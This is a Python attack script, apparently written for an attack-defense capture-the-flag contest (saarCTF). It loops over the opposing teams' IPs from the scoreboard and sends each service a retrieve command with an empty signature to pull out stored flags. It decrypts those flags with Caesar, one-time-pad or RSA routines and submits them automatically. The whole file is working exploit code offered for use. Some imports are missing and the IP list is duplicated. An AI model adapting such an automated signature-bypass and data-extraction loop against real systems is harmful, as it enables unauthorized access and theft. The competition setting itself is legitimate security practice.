import requests
import json
import time
import sys
from pwn import *
from binascii import unhexlify
from multiprocessing import Pool
from Crypto.Util.number import long_to_bytes, bytes_to_long

attack_file = 'https://scoreboard.ctf.saarland/attack.json'
captured_flags = dict()

def findFlag(string):
    match = re.search(r"SAAR{.+}", string)
    if match is None:
        return None
    return match.group(0)

def decryptPlain(response):
    string = unhexlify(response["data"])
    return findFlag(str(string))

def decryptCaesar(response):
    data = response["data"]
    key = response["params"]["key"]
    shift = key
    string = str(bytes([(x - key) % 256 for x in unhexlify(data)]))
    return findFlag(string)

def decryptOtp(response):
    data = binascii.unhexlify(response['data'])
    key = binascii.unhexlify(response['params']['encryptionkey'])
    ret = str(bytes([m ^ k for (m, k) in zip(data, key)]))
    return findFlag(ret)

def decryptSaar(response):
    data = response['data']
    c = bytes_to_long(binascii.unhexlify(data))
    e = response['params']['e']
    n = response['params']['n']
    print(e)
    if e == 65537:
        cmd='RsaCtfTool/RsaCtfTool.py --uncipher ' + str(c) + ' -n ' + str(n) + ' -e ' + str(e)
        cmd=cmd.split()
        ret = str(subprocess.check_output(cmd, timeout=2))
        return findFlag(ret)
    return None

methods = {
    "plain": decryptPlain,
    "caesar": decryptCaesar,
    "otp": decryptOtp,
    "saar": decryptSaar,
}

def submit_flag(flag):
    #context.log_level = 'debug'
    sub = remote("submission.ctf.saarland", 31337)
    sub.send(flag + "\n")
    result = sub.recvline(timeout=10)
    if result == '':
        print("didn't receive submission result")
    print(str(result))
    sub.close()

def attack(ip, flagid):
    try:
        #context.log_level = 'debug'
        c = remote(ip, 4711)
        data = c.recvuntil("command:\n", timeout=10)
        if data == '':
            raise Exception('timed out waiting for "command:"')
        c.send(f'{{"command": "db_retrieve_item", "data": "{flagid}"}}\n')
        data = c.recvuntil("signature:\n", timeout=10)
        if data == '':
            raise Exception('timed out waiting for "signature:"')
        c.send(b'\n')
        response = json.loads(c.recvline(timeout=10))
        if response == '':
            raise Exception('timeout waiting for response')
        method = response["params"]["method"]
        print(method)
        decrypt = methods.get(method)
        if decrypt is None:
            print(f"could not decrypt {method}")
            return None
        flag = decrypt(response)
        c.close()
        if flag is not None:
            print("found flag! ", flag)
            submit_flag(flag)
        return(flag)
    except Exception as e:
        print(f"{ip} attack failed: {e}")

while True:
    resp = requests.get(url=attack_file)
    data = resp.json()
    teams = data['teams']
    flag_ids = data['flag_ids']["Let's Schwenkrypt"]
    for team in teams:
        if team['name'] == "burner_herz0g":
            print("don't attack yourself, burner_herz0g! skipping.")
            continue
        if team['online'] is False:
            print(team['name'], " is not online, skipping.")
            continue
        if team['ip'] == "10.32.4.2":
            print("skipping 4")
            continue
        print("attacking: ", team['name'], team['id'], team['ip'])

        team_ips = []
        team_flags = []
        for tick in flag_ids[team['ip']]:
            team_ips.append(team['ip'])
            team_ips.append(team['ip'])
            team_flags += flag_ids[team['ip']][tick]
        print(team_ips)
        print("team flag id's: ", team_flags)

        p = Pool(8)
        p.starmap(attack, zip(team_ips, team_flags))
        p.close()
        p.join()
    
    print('round 2... FIGHT!')

